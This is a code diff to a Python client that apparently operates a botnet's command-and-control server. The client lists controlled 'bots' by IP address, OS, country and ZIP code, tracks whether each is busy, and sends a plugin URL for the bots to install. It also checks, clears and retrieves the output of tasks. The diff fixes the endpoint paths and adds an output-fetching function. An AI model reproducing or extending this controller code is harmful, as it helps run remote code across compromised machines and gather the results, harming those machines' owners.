@@ -15,7 +15,7 @@ class Operations:
             return -1
         current = time.time()
         for bot in json.loads(r.text):
-            item = {'id': bot['id'], 'lastSeen': int(current - bot['lastSeen'] / 1000)}
+            item = {'busy': bot['busy'], 'id': bot['id'], 'lastSeen': int(current - bot['lastSeen'] / 1000)}
             for key in bot['properties']:
                 item[key] = bot['properties'][key]
             bot_list.append(item)
@@ -30,7 +30,7 @@ class Operations:
             return -1
         current = time.time()
         for bot in json.loads(r.text):
-            item = {'id': bot['id'], 'lastSeen': int(current - bot['lastSeen'] / 1000)}
+            item = {'busy': bot['busy'], 'id': bot['id'], 'lastSeen': int(current - bot['lastSeen'] / 1000)}
             for key in bot['properties']:
                 item[key] = bot['properties'][key]
             bot_list.append(item)
@@ -42,8 +42,8 @@ class Operations:
 
     @staticmethod
     def print_list(bot_list):
-        properties = ['id', 'ipAddress', 'lastSeen', 'os', 'countryCode', 'zip']
-        print("ID ADDRESS LASTSEEN OS COUNTRY ZIP")
+        properties = ['id', 'busy', 'ipAddress', 'lastSeen', 'os', 'countryCode', 'zip']
+        print("ID BUSY ADDRESS LASTSEEN OS COUNTRY ZIP")
         for bot in bot_list:
             for key in properties:
                 if key in bot:
@@ -75,7 +75,7 @@ class Operations:
 
     @staticmethod
     def install(host, port, url):
-        r = requests.post('http://' + host + ':' + port + 'control/plugin', url)
+        r = requests.post('http://' + host + ':' + port + '/control/plugin', url)
         if r.status_code != 200:
             print('ERROR: ' + r.text)
             return -1
@@ -83,7 +83,7 @@ class Operations:
 
     @staticmethod
     def status(host, port, task_id):
-        r = requests.post('http://' + host + ':' + port + 'control/status', task_id)
+        r = requests.get('http://' + host + ':' + port + '/control/check/' + task_id)
         if r.status_code != 200:
             print('ERROR: ' + r.text)
             return -1
@@ -97,8 +97,16 @@ class Operations:
 
     @staticmethod
     def clear(host, port, task_id):
-        r = requests.post('http://' + host + ':' + port + 'control/clear', task_id)
+        r = requests.get('http://' + host + ':' + port + '/control/clear/' + task_id)
         if r.status_code != 200:
             print('ERROR: ' + r.text)
             return -1
+        return json.loads(r.text)
+
+    @staticmethod
+    def output(host, port, task_id):
+        r = requests.get('http://' + host + ':' + port + '/control/output/' + task_id)
+        if r.status_code != 200:
+            print('ERROR: ' + r.text)
+            return '-1'
         return json.loads(r.text)
